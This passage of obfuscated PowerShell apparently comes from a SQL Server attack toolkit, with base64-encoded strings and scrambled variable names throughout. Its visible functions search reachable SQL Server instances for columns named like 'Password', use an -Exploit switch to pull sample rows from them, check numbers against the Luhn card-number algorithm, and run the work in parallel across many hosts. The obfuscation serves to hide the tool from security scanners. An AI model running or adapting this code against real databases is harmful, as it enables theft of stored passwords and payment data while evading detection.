        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABQAEUAUgBNAEkAUwBTAEkATwBOACAALQAgAEkATQBQAEUAUgBTAE8ATgBBAFQARQAgAEwATwBHAEkATgA=')))
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return ${_/=\/\_/=====\/\_}
        }
    }
}
Function Invoke-SQLAuditSampleDataByColumn
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of records to sample.')]
        [int]$SampleSize = 1,
        [Parameter(Mandatory = $false,
        HelpMessage = ' Column name to search for.')]
        [string]$Keyword = 'Password'
    )
    Begin
    {
        ${_/=\/\_/=====\/\_} = New-Object -TypeName System.Data.DataTable
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBUAEEAUgBUACAAVgBVAEwATgBFAFIAQQBCAEkATABJAFQAWQAgAEMASABFAEMASwA6ACAAUwBFAEEAUgBDAEgAIABEAEEAVABBACAAQgBZACAAQwBPAEwAVQBNAE4A')))
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not ${__/\_/=\/==\_/=\_})
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAEYAQQBJAEwARQBEAA==')))
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABTAEUAQQBSAEMASAAgAEQAQQBUAEEAIABCAFkAIABDAE8ATABVAE0ATgA=')))
            Return
        }
        else
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAFMAVQBDAEMARQBTAFMA')))
        }
        if($Exploit)
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        ${/=\/====\_/\/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHQAZQBuAHQAaQBhAGwAbAB5ACAAUwBlAG4AcwBpAHQAaQB2AGUAIABDAG8AbAB1AG0AbgBzACAARgBvAHUAbgBkAA==')))
        ${__/\/\_______/==\}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAGwAdQBtAG4AcwAgAHcAZQByAGUAIABmAG8AdQBuAGQAIABpAG4AIABuAG8AbgAgAGQAZQBmAGEAdQBsAHQAIABkAGEAdABhAGIAYQBzAGUAcwAgAHQAaABhAHQAIABtAGEAeQAgAGMAbwBuAHQAYQBpAG4AIABzAGUAbgBzAGkAdABpAHYAZQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAuAA==')))
        ${____/\__/===\/===}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHMAdQByAGUAIAB0AGgAYQB0ACAAYQBsAGwAIABwAGEAcwBzAHcAbwByAGQAcwAgAGEAbgBkACAAcwBlAG4AcwB0AGkAdgBlACAAZABhAHQAYQAgAGEAcgBlACAAbQBhAHMAawBlAGQALAAgAGgAYQBzAGgAZQBkACwAIABvAHIAIABlAG4AYwByAHkAcAB0AGUAZAAuAA==')))
        ${/=\_/=\_/=\_/\/=\}      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGYAbwByAG0AYQB0AGkAbwBuAGEAbAA=')))
        ${____/=\_/=\___/=\}  = 'No'
        ${___/=\/=\_/=\_/==} = 'No'
        ${__/\/\_/==\/==\/\}     = 'No'
        ${_____/\/========\}    = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUwBhAG0AcABsAGUARABhAHQAYQBCAHkAQwBvAGwAdQBtAG4AIAAtAEkAbgBzAHQAYQBuAGMAZQAgACQASQBuAHMAdABhAG4AYwBlACAALQBFAHgAcABsAG8AaQB0AA==')))
        ${/=\/=\_/\/\/\/\_/}       = ''
        ${______/=\/==\/===}     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AcwBkAG4ALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AZQBuAC0AdQBzAC8AbABpAGIAcgBhAHIAeQAvAG0AcwAxADgAOAAzADQAOAAuAGEAcwBwAHgA')))
        ${_/\____/\/==\/\/\}        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIABjAG8AbAB1AG0AbgAgAG4AYQBtAGUAcwAgAHQAaABhAHQAIABtAGEAdABjAGgAIABjAHIAaQB0AGUAcgBpAGEALgAuAC4A')))
        ${_/=\/=\/\/==\/\_/} = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -ColumnNameSearch $Keyword -NoDefaults -SuppressVerbose
        if(${_/=\/=\/\/==\/\_/})
        {
            ${____/=\_/=\___/=\}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
        }
        else
        {
            ${____/=\_/=\___/=\}  = 'No'
        }
        if(${____/=\_/=\___/=\} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
        {
            ${_/=\/=\/\/==\/\_/}|
            % -Process {
                $DatabaseName = $_.DatabaseName
                $SchemaName = $_.SchemaName
                $TableName = $_.TableName
                $ColumnName = $_.ColumnName
                ${/==\______/===\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAEQAYQB0AGEAYgBhAHMAZQBOAGEAbQBlAF0ALgBbACQAUwBjAGgAZQBtAGEATgBhAG0AZQBdAC4AWwAkAFQAYQBiAGwAZQBOAGEAbQBlAF0ALgBbACQAQwBvAGwAdQBtAG4ATgBhAG0AZQBdAA==')))
                ${/\____/\__/====\_} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAEQAYQB0AGEAYgBhAHMAZQBOAGEAbQBlAF0ALgBbACQAUwBjAGgAZQBtAGEATgBhAG0AZQBdAC4AWwAkAFQAYQBiAGwAZQBOAGEAbQBlAF0A')))
                $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBTAEUAIAAkAEQAYQB0AGEAYgBhAHMAZQBOAGEAbQBlADsAIABTAEUATABFAEMAVAAgAFQATwBQACAAJABTAGEAbQBwAGwAZQBTAGkAegBlACAAWwAkAEMAbwBsAHUAbQBuAE4AYQBtAGUAXQAgAEYAUgBPAE0AIAAkAHsALwBcAF8AXwBfAF8ALwBcAF8AXwAvAD0APQA9AD0AXABfAH0AIAA=')))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEMAbwBsAHUAbQBuACAAbQBhAHQAYwBoADoAIAAkAHsALwA9AD0AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwAvAH0A')))
                if(${____/=\_/=\___/=\} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                {
                    $TblTargetColumns |
                    % -Process {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAWABQAEwATwBJAFQASQBOAEcAOgAgAFMAZQBsAGUAYwB0AGkAbgBnACAAZABhAHQAYQAgAHMAYQBtAHAAbABlACAAZgByAG8AbQAgAGMAbwBsAHUAbQBuACAAJAB7AC8APQA9AFwAXwBfAF8AXwBfAF8ALwA9AD0APQBcAF8ALwB9AC4A')))
                        ${___/=\__/\/=\/=\_} = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $Query -SuppressVerbose |
                        ConvertTo-Csv -NoTypeInformation |
                        select -Skip 1
                        if(${___/=\__/\/=\/=\_})
                        {
                            ${/=\/=\_/\/\/\/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQAgAHMAYQBtAHAAbABlACAAZgByAG8AbQAgACQAewAvAD0APQBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAC8AfQAgADoAIAAkAHsAXwBfAF8ALwA9AFwAXwBfAC8AXAAvAD0AXAAvAD0AXABfAH0ALgA=')))
                        }
                        else
                        {
                            ${/=\/=\_/\/\/\/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAZABhAHQAYQAgAGYAbwB1AG4AZAAgAGkAbgAgAGEAZgBmAGUAYwB0AGUAZAAgAGMAbwBsAHUAbQBuADoAIAAkAHsALwA9AD0AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwAvAH0ALgA=')))
                        }
                        ${___/=\/=\_/=\_/==} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                        ${__/\/\_/==\/==\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                        $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${/=\/====\_/\/===\}, ${__/\/\_______/==\}, ${____/\__/===\/===}, ${/=\_/=\_/=\_/\/=\}, ${____/=\_/=\___/=\}, ${___/=\/=\_/=\_/==}, ${__/\/\_/==\/==\/\}, ${_____/\/========\}, ${/=\/=\_/\/\/\/\_/}, ${______/=\/==\/===}, ${_/\____/\/==\/\/\})
                    }
                }
                else
                {
                    ${/=\/=\_/\/\/\/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBmAGYAZQBjAHQAZQBkACAAYwBvAGwAdQBtAG4AOgAgACQAewAvAD0APQBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAC8AfQAuAA==')))
                    ${___/=\/=\_/=\_/==} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                    $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${/=\/====\_/\/===\}, ${__/\/\_______/==\}, ${____/\__/===\/===}, ${/=\_/=\_/=\_/\/=\}, ${____/=\_/=\___/=\}, ${___/=\/=\_/=\_/==}, ${__/\/\_/==\/==\/\}, ${_____/\/========\}, ${/=\/=\_/\/\/\/\_/}, ${______/=\/==\/===}, ${_/\____/\/==\/\/\})
                }
            }
        }
        else
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAE4AbwAgAGMAbwBsAHUAbQBuAHMAIAB3AGUAcgBlACAAZgBvAHUAbgBkACAAdABoAGEAdAAgAG0AYQB0AGMAaABlAGQAIAB0AGgAZQAgAHMAZQBhAHIAYwBoAC4A')))
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABTAEUAQQBSAEMASAAgAEQAQQBUAEEAIABCAFkAIABDAE8ATABVAE0ATgA=')))
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return ${_/=\/\_/=====\/\_}
        }
    }
}

function Test-IsLuhnValid
{
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeline = $true)]
        [uint64]$Number
    )
    ${/=====\_________/} = ConvertTo-Digits -Number $Number
    ${__/===\_____/\/==} = ${/=====\_________/}[-1]
    ${_/\__/\/\/====\_/} = ${/=====\_________/}[0..(${/=====\_________/}.Count - 2)] -join ''
    ${_/===\/=\/\__/\/\} = Get-LuhnCheckSum -Number ${_/\__/\/\/====\_/}
    ${/=\/=\_/===\/====} = ([string]${_/\__/\/\/====\_/}).Length
    if (((${_/===\/=\/\__/\/\} + ${__/===\_____/\/==}) % 10) -eq 0 -and ${/=\/=\_/===\/====} -ge 12)
    {
        Write-Host -InputObject $true
    }
    else
    {
        Write-Host -InputObject $false
    }
}
function ConvertTo-Digits
{
    [OutputType([System.Byte[]])]
    [CmdletBinding()]
    param(
        [Parameter(Position = 0, Mandatory = $true, ValueFromPipeline = $true)]
        [uint64]$Number
    )
    ${/====\_/=====\___} = $Number
    ${/==\/=\/\/\/===\/} = 1 + [convert]::ToUInt64([math]::Floor(([math]::Log10(${/====\_/=====\___}))))
    ${_/==\/\/\/==\_/\_} = New-Object -TypeName Byte[] -ArgumentList ${/==\/=\/\/\/===\/}
    for (${_/\_/\/\__/\____/} = (${/==\/=\/\/\/===\/} - 1); ${_/\_/\/\__/\____/} -ge 0; ${_/\_/\/\__/\____/}--)
    {
        ${__/\/==\/\_/====\} = ${/====\_/=====\___} % 10
        ${_/==\/\/\/==\_/\_}[${_/\_/\/\__/\____/}] = ${__/\/==\/\_/====\}
        ${/====\_/=====\___} = [math]::Floor(${/====\_/=====\___} / 10)
    }
    Write-Host -InputObject ${_/==\/\/\/==\_/\_}
}
function Invoke-Parallel
{
    [cmdletbinding(DefaultParameterSetName = 'ScriptBlock')]
    Param (
        [Parameter(Mandatory = $false,position = 0,ParameterSetName = 'ScriptBlock')]
        [System.Management.Automation.ScriptBlock]$ScriptBlock,
        [Parameter(Mandatory = $false,ParameterSetName = 'ScriptFile')]
        [ValidateScript({
                    Test-Path $_ -PathType leaf
        })]
        $ScriptFile,
        [Parameter(Mandatory = $true,ValueFromPipeline = $true)]
        [Alias('CN','__Server','IPAddress','Server','ComputerName')]
        [PSObject]$InputObject,
        [PSObject]$Parameter,
        [switch]$ImportSessionFunctions,
        [switch]$ImportVariables,
        [switch]$ImportModules,
        [int]$Throttle = 20,
        [int]$SleepTimer = 200,
        [int]$RunspaceTimeout = 0,
        [switch]$NoCloseOnTimeout = $false,
        [int]$MaxQueue,
        [validatescript({
                    Test-Path (Split-Path -Path $_ -Parent)
        })]
        [string]$LogFile = 'C:\temp\log.log',
        [switch] $Quiet = $false
    )
    Begin {
        if( -not $PSBoundParameters.ContainsKey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAUQB1AGUAdQBlAA==')))) )
        {
            if($RunspaceTimeout -ne 0)
            {
                $script:MaxQueue = $Throttle
            }
            else
            {
                $script:MaxQueue = $Throttle * 3
            }
        }
        else
        {
            $script:MaxQueue = $MaxQueue
        }
        if ($ImportVariables -or $ImportModules)
        {
            ${__/\/\/==\_____/=} = [powershell]::Create().addscript({
                    ${/==\_____/=\_____} = gmo | select -ExpandProperty Name
                    ${_/=\__/==\_/\__/=} = Get-PSSnapin | select -ExpandProperty Name
                    ${_/=\_/\/\_/\/=\/\} = gv | select -ExpandProperty Name
                    @{
                        Variables = ${_/=\_/\/\_/\/=\/\}
                        Modules   = ${/==\_____/=\_____}
                        Snapins   = ${_/=\__/==\_/\__/=}
                    }
            }).invoke()[0]
            if ($ImportVariables)
            {
                Function _temp
                {
                    [cmdletbinding()] param()
                }
                ${_/=====\/=\_/\_/\} = @( (gcm _temp | select -ExpandProperty parameters).Keys + $PSBoundParameters.Keys + ${__/\/\/==\_____/=}.Variables )
                ${/=\_/\/=\/\/\__/\} = @( gv | ? -FilterScript {
                        -not (${_/=====\/=\_/\_/\} -contains $_.Name)
                } )
            }
            if ($ImportModules)
            {
                ${/=\_____/=\_/=\/=} = @( gmo |
                    ? -FilterScript {
                        ${__/\/\/==\_____/=}.Modules -notcontains $_.Name -and (Test-Path -Path $_.Path -ErrorAction SilentlyContinue)
                    } |
                select -ExpandProperty Path )
                ${___/\/\/==\__/\/\} = @( Get-PSSnapin |
                    select -ExpandProperty Name |
                    ? -FilterScript {
                        ${__/\/\/==\_____/=}.Snapins -notcontains $_
                } )
            }
        }
        Function Get-RunspaceData
        {
            [cmdletbinding()]
            param( [switch]$Wait )
            Do
            {
                ${/=\/\_/=\/=\/\/\_} = $false
                if (-not $Quiet)
                {
                    Write-Progress  -Activity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AbgBpAG4AZwAgAFEAdQBlAHIAeQA='))) -Status $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AGkAbgBnACAAdABoAHIAZQBhAGQAcwA=')))`
                    -CurrentOperation $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AFwALwA9AD0APQBcAC8APQBcAC8AXABfAF8ALwB9ACAAdABoAHIAZQBhAGQAcwAgAGQAZQBmAGkAbgBlAGQAIAAtACAAJAB7AC8APQBcAF8ALwA9AFwAXwAvAD0APQBcAC8AXABfAF8AXwB9ACAAaQBuAHAAdQB0ACAAbwBiAGoAZQBjAHQAcwAgAC0AIAAkAHsAcwBjAHIAaQBwAHQAOgBfAF8ALwBcAF8ALwBcAC8AXAAvAD0AXABfAF8ALwA9AFwAfQAgAGkAbgBwAHUAdAAgAG8AYgBqAGUAYwB0AHMAIABwAHIAbwBjAGUAcwBzAGUAZAA=')))`
                    -PercentComplete $( Try
                        {
                            ${script:__/\_/\/\/=\__/=\} / ${/=\_/=\_/==\/\___} * 100
                        }
                        Catch
                        {
                            0
                        }
                    )
                }
                Foreach(${/=\___/=\_/=\_/\/} in ${__/\__/===\/\_/=\})
                {
                    ${/===\_/====\/\_/\} = Get-Date
                    ${__/\/\/===\/\/==\} = ${/===\_/====\/\_/\} - ${/=\___/=\_/=\_/\/}.startTime
                    ${_/==\/=\/==\___/=} = [math]::Round( ${__/\/\/===\/\/==\}.totalminutes ,2 )
                    ${_/==\__/\__/===\/} = '' | select -Property Date, Action, Runtime, Status, Details
                    ${_/==\__/\__/===\/}.Action = "Removing:'$(${/=\___/=\_/=\_/\/}.object)'"
                    ${_/==\__/\__/===\/}.Date = ${/===\_/====\/\_/\}
                    ${_/==\__/\__/===\/}.Runtime = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AD0AXAAvAD0AXAAvAD0APQBcAF8AXwBfAC8APQB9ACAAbQBpAG4AdQB0AGUAcwA=')))
                    If (${/=\___/=\_/=\_/\/}.Runspace.isCompleted)
                    {
                        ${script:__/\_/\/\/=\__/=\}++
                        if(${/=\___/=\_/=\_/\/}.powershell.Streams.Error.Count -gt 0)
                        {
                            ${_/==\__/\__/===\/}.status = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcABsAGUAdABlAGQAVwBpAHQAaABFAHIAcgBvAHIAcwA=')))
                            foreach(${_/=\/==\/===\____} in ${/=\___/=\_/=\_/\/}.powershell.Streams.Error)
                            {
                                Write-Error -ErrorRecord ${_/=\/==\/===\____}
                            }
                        }
                        else
                        {
                            ${_/==\__/\__/===\/}.status = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcABsAGUAdABlAGQA')))
                        }
                        ${/=\___/=\_/=\_/\/}.powershell.EndInvoke(${/=\___/=\_/=\_/\/}.Runspace)
                        ${/=\___/=\_/=\_/\/}.powershell.dispose()
                        ${/=\___/=\_/=\_/\/}.Runspace = $null
                        ${/=\___/=\_/=\_/\/}.powershell = $null
                    }
                    ElseIf ( $RunspaceTimeout -ne 0 -and ${__/\/\/===\/\/==\}.totalseconds -gt $RunspaceTimeout)
                    {
                        ${script:__/\_/\/\/=\__/=\}++
                        ${_/\__/====\__/\__} = $true
                        ${_/==\__/\__/===\/}.status = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBkAE8AdQB0AA==')))
                        Write-Error -Message "Runspace timed out at $(${__/\/\/===\/\/==\}.totalseconds) seconds for the object:`n$(${/=\___/=\_/=\_/\/}.object | Out-String)"
                        if (!$NoCloseOnTimeout)
                        {
                            ${/=\___/=\_/=\_/\/}.powershell.dispose()
                        }
                        ${/=\___/=\_/=\_/\/}.Runspace = $null
                        ${/=\___/=\_/=\_/\/}.powershell = $null
                        ${__/\_/\/\/=\__/=\}++
                    }
                    ElseIf (${/=\___/=\_/=\_/\/}.Runspace -ne $null )
                    {
                        ${_/==\__/\__/===\/} = $null
                        ${/=\/\_/=\/=\/\/\_} = $true
                    }
                }
                ${/==\/\/=\/=\_____} = ${__/\__/===\/\_/=\}.clone()
                ${/==\/\/=\/=\_____} |
                ? -FilterScript {
                    $_.runspace -eq $null
                } |
                % -Process {
                    ${__/\__/===\/\_/=\}.remove($_)
                }
                if($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBhAGkAdAA=')))])
                {
                    sleep -Milliseconds $SleepTimer
                }
            }
            while (${/=\/\_/=\/=\/\/\_} -and $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBhAGkAdAA=')))])
        }
        if($PSCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAHIAaQBwAHQARgBpAGwAZQA='))))
        {
            $ScriptBlock = [scriptblock]::Create( $(gc $ScriptFile | Out-String) )
        }
        elseif($PSCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAHIAaQBwAHQAQgBsAG8AYwBrAA=='))))
        {
            [string[]]${_/=\/=\/\__/\__/\} = '$_'
            if( $PSBoundParameters.ContainsKey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAYQBtAGUAdABlAHIA')))) )
            {
                ${_/=\/=\/\__/\__/\} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABQAGEAcgBhAG0AZQB0AGUAcgA=')))
            }
            ${_______/=======\/} = $null
            if($PSVersionTable.PSVersion.Major -gt 2)
            {
                ${/=\/=\/\__/=\_/\/} = $ScriptBlock.ast.FindAll({
                        $args[0] -is [System.Management.Automation.Language.UsingExpressionAst]
                },$true)
                If (${/=\/=\/\__/=\_/\/})
                {
                    $List = New-Object -TypeName $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBDAG8AbABsAGUAYwB0AGkAbwBuAHMALgBHAGUAbgBlAHIAaQBjAC4ATABpAHMAdABgADEAWwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4ATABhAG4AZwB1AGEAZwBlAC4AVgBhAHIAaQBhAGIAbABlAEUAeABwAHIAZQBzAHMAaQBvAG4AQQBzAHQAXQA=')))
                    ForEach (${/===\/=\/=\/\/\__} in ${/=\/=\/\__/=\_/\/})
                    {
                        [void]$List.Add(${/===\/=\/=\/\/\__}.SubExpression)
                    }
                    ${__/=\____/\___/=\} = ${/=\/=\/\__/=\_/\/} |
                    group -Property SubExpression |
                    % -Process {
                        $_.Group |
                        select -First 1
                    }
                    ${_______/=======\/} = ForEach (${/=\__/\_/==\__/=\} in ${__/=\____/\___/=\})
                    {
                        Try
                        {
                            ${__/=\_/\/\_/=\__/} = gv -Name ${/=\__/\_/==\__/=\}.SubExpression.VariablePath.UserPath -ErrorAction Stop
                            [pscustomobject]@{
                                Name       = ${/=\__/\_/==\__/=\}.SubExpression.Extent.Text
                                Value      = ${__/=\_/\/\_/=\__/}.Value
                                NewName    = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABfAF8AdQBzAGkAbgBnAF8AewAwAH0A'))) -f ${/=\__/\_/==\__/=\}.SubExpression.VariablePath.UserPath)
                                NewVarName = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBfAHUAcwBpAG4AZwBfAHsAMAB9AA=='))) -f ${/=\__/\_/==\__/=\}.SubExpression.VariablePath.UserPath)
                            }
                        }
                        Catch
                        {
                            Write-Error -Message "$(${/=\__/\_/==\__/=\}.SubExpression.Extent.Text) is not a valid Using: variable!"
                        }
                    }
                    ${_/=\/=\/\__/\__/\} += ${_______/=======\/} | select -ExpandProperty NewName -Unique
                    ${____/==\/\_/====\} = ${_______/=======\/}.NewName -join ', '
                    ${/=\/==\/\___/==\/} = [Tuple]::Create($List, ${____/==\/\_/====\})
